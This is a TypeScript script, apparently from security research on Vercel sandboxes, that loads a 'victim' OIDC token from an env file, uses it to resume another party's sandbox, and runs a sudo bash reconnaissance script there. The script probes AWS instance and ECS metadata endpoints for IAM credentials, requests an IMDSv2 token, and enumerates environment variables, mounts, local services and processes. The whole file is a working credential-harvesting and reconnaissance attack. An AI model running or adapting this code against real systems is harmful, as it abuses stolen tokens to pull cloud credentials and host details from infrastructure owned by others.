import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());

const SCRIPT = `
echo "===== [AWS] INTERFACES ====="
ip addr 2>/dev/null; ip route 2>/dev/null; ip neigh 2>/dev/null
echo "===== [AWS] IMDSv1 ====="
curl -s -m 4 http://169.254.169.254/latest/meta-data/ 2>&1 | head -20
echo "---- IMDSv1 IAM roles ----"
curl -s -m 4 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>&1 | head -10
echo "===== [AWS] IMDSv2 ====="
TOK=$(curl -s -m 4 -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>&1)
echo "TOKEN:[$TOK]"
curl -s -m 4 -H "X-aws-ec2-metadata-token: $TOK" http://169.254.169.254/latest/meta-data/ 2>&1 | head -20
echo "===== [AWS] ECS metadata ====="
curl -s -m 4 http://169.254.170.2/v2/metadata 2>&1 | head -5
curl -s -m 4 http://169.254.170.2/v2/credentials 2>&1 | head -5
echo "===== [AWS] route/DNS ====="
cat /etc/resolv.conf
getent hosts $(hostname) 2>&1
getent hosts ip-172-31-0-2.ec2.internal 2>&1
echo "===== [AWS] public ip ====="
curl -s -m 6 https://api.ipify.org 2>&1; echo
curl -s -m 6 http://checkip.amazonaws.com 2>&1; echo
echo "===== [AWS] ec2 api reachable? ====="
curl -s -m 5 https://ec2.us-east-1.amazonaws.com/ 2>&1 | head -3
echo "===== [VERCEL] env ====="
env | sort | grep -v -E "VERCEL_OIDC_TOKEN|TOKEN|SECRET|KEY|PASSWORD" | head -40
echo "===== [VERCEL] /run/vercel ====="
find /run/vercel -maxdepth 4 2>/dev/null | head -60
echo "===== [VERCEL] mounts ====="
mount 2>/dev/null | head -30
echo "===== [VERCEL] cmdline ====="
cat /proc/cmdline
echo "===== [VERCEL] virtio ====="
ls /sys/bus/virtio/devices/ 2>/dev/null
echo "===== [VERCEL] local services ====="
ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null
for p in 23456 30001 30002 2050 8080 3000; do
  echo "--- :$p ---"
  curl -s -m 2 http://127.0.0.1:$p/ 2>&1 | head -5
done
echo "===== [VERCEL] dmesg tail ====="
dmesg 2>/dev/null | tail -20
echo "===== [VERCEL] processes ====="
ps auxww 2>/dev/null | head -30
echo DONE
`;

async function main() {
  const sbx = await Sandbox.get({
    name: "victim-np",
    token: VICTIM, teamId: V.owner_id, projectId: V.project_id,
  });
  console.log("resumed:", sbx.name);
  const res = await sbx.runCommand("bash", ["-c", SCRIPT], { sudo: true, wait: true, timeout: 60_000 });
  console.log(res);
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });